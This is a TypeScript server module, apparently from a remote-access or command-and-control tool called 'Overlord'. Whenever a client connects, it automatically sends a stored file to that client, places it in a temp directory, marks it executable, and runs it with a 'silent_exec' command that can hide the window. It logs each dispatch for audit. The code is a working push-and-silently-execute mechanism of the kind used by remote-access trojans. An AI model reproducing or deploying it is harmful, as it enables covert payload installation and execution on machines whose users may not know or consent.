import type { ServerWebSocket } from "bun";
import { v4 as uuidv4 } from "uuid";
import { hasAutoDeployRun, getAutoDeploysByTrigger, recordAutoDeployRun } from "../db";
import { logger } from "../logger";
import { metrics } from "../metrics";
import { encodeMessage } from "../protocol";
import type { SocketData } from "../sessions/types";
import type { ClientInfo } from "../types";
import { logAudit, AuditAction } from "../auditLog";
import { normalizeClientOs } from "./deploy-utils";
import { createUploadPull } from "./file-transfer-state";

export function dispatchAutoDeploysForConnection(
  info: ClientInfo,
  ws: ServerWebSocket<SocketData>,
  serverOrigin: string,
): void {
  if (info.role !== "client") return;
  if (ws.data?.autoDeploysRan) return;

  const isNewClient = ws.data?.wasKnown === false;
  const onConnect = getAutoDeploysByTrigger("on_connect");
  const onFirst = isNewClient ? getAutoDeploysByTrigger("on_first_connect") : [];
  const onConnectOnce = getAutoDeploysByTrigger("on_connect_once");
  const deploys = [...onConnect, ...onFirst, ...onConnectOnce];

  if (deploys.length === 0) {
    ws.data.autoDeploysRan = true;
    return;
  }

  const clientOs = normalizeClientOs(info.os);

  for (const deploy of deploys) {
    if (deploy.osFilter.length > 0) {
      const rawOs = (info.os || "").toLowerCase();
      if (!deploy.osFilter.includes(rawOs)) {
        continue;
      }
    }

    if (deploy.trigger === "on_connect_once") {
      if (hasAutoDeployRun(deploy.id, info.id)) {
        continue;
      }
      recordAutoDeployRun(deploy.id, info.id);
    }

    // Verify the file still exists
    try {
      const stat = Bun.file(deploy.filePath);
      if (stat.size === 0) {
        logger.warn(`[auto-deploy] file missing for ${deploy.id}: ${deploy.filePath}`);
        continue;
      }
    } catch {
      logger.warn(`[auto-deploy] file inaccessible for ${deploy.id}: ${deploy.filePath}`);
      continue;
    }

    const destDir = clientOs === "windows"
      ? `C:\\Windows\\Temp\\Overlord\\auto-${deploy.id}`
      : `/tmp/overlord/auto-${deploy.id}`;
    const destPath = clientOs === "windows"
      ? `${destDir}\\${deploy.fileName}`
      : `${destDir}/${deploy.fileName}`;

    const pullId = createUploadPull({
      clientId: info.id,
      filePath: deploy.filePath,
      fileName: deploy.fileName,
      size: deploy.fileSize,
      ttlMs: 120_000,
    });
    const pullUrl = `${serverOrigin}/api/file/upload/pull/${encodeURIComponent(pullId)}`;

    try {
      info.ws.send(
        encodeMessage({
          type: "command",
          commandType: "file_upload_http" as any,
          id: uuidv4(),
          payload: { path: destPath, url: pullUrl, total: deploy.fileSize },
        }),
      );

      if (clientOs !== "windows") {
        info.ws.send(
          encodeMessage({
            type: "command",
            commandType: "file_chmod" as any,
            id: uuidv4(),
            payload: { path: destPath, mode: "0755" },
          }),
        );
      }

      info.ws.send(
        encodeMessage({
          type: "command",
          commandType: "silent_exec" as any,
          id: uuidv4(),
          payload: { command: destPath, args: deploy.args, hideWindow: deploy.hideWindow },
        }),
      );

      metrics.recordCommand("silent_exec");
      logAudit({
        timestamp: Date.now(),
        username: "system",
        ip: "server",
        action: AuditAction.SILENT_EXECUTE,
        targetClientId: info.id,
        success: true,
        details: `auto-deploy:${deploy.name} trigger=${deploy.trigger} file=${deploy.fileName}`,
      });
      logger.info(`[auto-deploy] dispatched ${deploy.id} (${deploy.trigger}) to ${info.id}`);
    } catch (err) {
      logger.warn(`[auto-deploy] failed to dispatch ${deploy.id} to ${info.id}`, err);
      logAudit({
        timestamp: Date.now(),
        username: "system",
        ip: "server",
        action: AuditAction.SILENT_EXECUTE,
        targetClientId: info.id,
        success: false,
        details: `auto-deploy:${deploy.name} trigger=${deploy.trigger} file=${deploy.fileName}`,
        errorMessage: (err as Error)?.message || "send failed",
      });
    }
  }

  ws.data.autoDeploysRan = true;
}
